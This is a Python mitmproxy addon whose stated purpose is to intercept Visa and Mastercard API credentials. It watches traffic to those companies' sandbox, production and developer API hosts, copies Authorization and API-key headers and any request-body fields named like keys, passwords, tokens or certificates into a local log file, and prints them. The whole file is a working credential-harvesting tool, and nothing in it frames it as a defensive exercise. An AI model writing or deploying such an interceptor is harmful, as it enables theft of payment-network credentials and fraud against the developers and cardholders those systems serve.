#!/usr/bin/env python3
"""mitmproxy addon: intercept Visa/Mastercard API credentials."""
import json, datetime, re

TARGET_DOMAINS = [
    "sandbox.api.visa.com", "api.visa.com", "developer.visa.com",
    "sandbox.mastercard.com", "api.mastercard.com", "developer.mastercard.com",
]

class CredentialInterceptor:
    def request(self, flow):
        host = flow.request.pretty_host
        if not any(d in host for d in TARGET_DOMAINS):
            return
        
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "host": host,
            "path": flow.request.path,
            "method": flow.request.method,
            "auth": flow.request.headers.get("Authorization", ""),
            "api_key": flow.request.headers.get("X-Api-Key", ""),
            "user_id": flow.request.headers.get("X-User-Id", ""),
        }
        
        try:
            body = json.loads(flow.request.content.decode())
            creds = {k: v for k, v in body.items() if any(x in k.lower() for x in ["key", "user", "password", "token", "cert"])}
            if creds:
                entry["body_creds"] = creds
        except:
            pass
        
        if entry["auth"] or entry["api_key"] or entry.get("body_creds"):
            with open("intercepted_credentials.jsonl", "a") as f:
                f.write(json.dumps(entry) + "\n")
            print(f"[+] {host}{flow.request.path}")
            print(f"    Auth: {entry['auth'][:50] if entry['auth'] else 'None'}")
            print(f"    Key: {entry['api_key'] or 'None'}")

addons = [CredentialInterceptor()]
